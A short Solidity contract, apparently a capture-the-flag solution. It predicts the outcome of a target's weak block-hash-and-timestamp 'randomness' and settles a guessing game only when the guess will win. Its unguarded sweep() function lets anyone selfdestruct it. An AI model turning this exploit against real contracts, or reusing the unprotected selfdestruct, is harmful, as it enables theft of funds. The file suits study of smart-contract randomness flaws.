// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.4.21;

interface ABI {
    function lockInGuess(uint8) external payable;
    function settle() external;
}

/**
 * @title PredictTheFuture
 * @dev Locks a guess and settle only if the number will match the locked guess
 */
contract PredictTheFuture {
    uint8 guess;

    function sendGuess(address _contract, uint8 _guess) public {
        guess = _guess;
        ABI(_contract).lockInGuess.value(1 ether)(_guess);
    }

    function predict(address _contract) public { // Requires to spam call, not practically feasible using Metamask (confirmation prompt...)
        require(guess == uint8(keccak256(block.blockhash(block.number - 1), now)) % 10);
        ABI(_contract).settle();
    }

    function sweep(address _to) public {
        selfdestruct(_to);
    }

    function PredictTheFuture() public payable {}
    function () payable public {}
}